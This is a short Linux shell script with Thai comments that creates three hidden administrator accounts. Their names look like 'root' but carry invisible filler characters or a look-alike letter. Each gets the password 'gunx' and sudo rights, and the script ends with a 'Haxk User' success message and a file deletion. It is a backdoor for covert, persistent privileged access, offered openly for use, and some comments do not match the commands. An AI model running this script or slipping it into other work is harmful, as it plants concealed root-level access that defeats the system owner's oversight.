# สร้างผู้ใช้และกำหนด UID เป็น 14

sudo useradd -u 21 rootㅤ
sudo useradd -u 22 rooƚㅤ
sudo useradd -u 23 rooxㅤ
# กำหนดรหัสผ่านของผู้ใช้ gunx เป็น "gunx"
echo "rootㅤ:gunx" | sudo chpasswd
echo "rooƚㅤ:gunx" | sudo chpasswd
echo "rooxㅤ:gunx" | sudo chpasswd
# เพิ่มผู้ใช้ gunx เข้าในกลุ่ม sudo
sudo usermod -aG sudo rootㅤ
sudo usermod -aG sudo rooƚㅤ
sudo usermod -aG sudo rooxㅤ
# แสดงข้อความยืนยัน
echo "Haxk User ถูกสร้างและกำหนดสิทธิ์เรียบร้อยแล้ว"
rm -f rool
